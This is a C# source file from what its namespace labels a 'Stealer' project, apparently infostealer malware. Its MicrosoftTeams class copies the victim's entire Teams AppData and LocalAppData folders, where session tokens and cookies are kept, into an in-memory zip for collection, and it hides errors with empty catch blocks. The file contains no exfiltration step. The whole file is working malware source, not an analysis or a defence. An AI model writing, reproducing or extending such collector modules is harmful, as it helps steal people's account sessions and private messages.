using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class MicrosoftTeams : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Microsoft Teams";
            int fileCount = 0;

            string teamsAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Teams");
            if (Directory.Exists(teamsAppData))
            {
                try
                {
                    string targetPath = "Teams\\AppData";
                    zip.AddDirectoryFiles(teamsAppData, targetPath);
                    counterApplications.Files.Add(teamsAppData + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            string teamsLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Teams");
            if (Directory.Exists(teamsLocal))
            {
                try
                {
                    string targetPath = "Teams\\LocalAppData";
                    zip.AddDirectoryFiles(teamsLocal, targetPath);
                    counterApplications.Files.Add(teamsLocal + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            if (fileCount > 0)
            {
                counterApplications.Files.Add("Teams\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
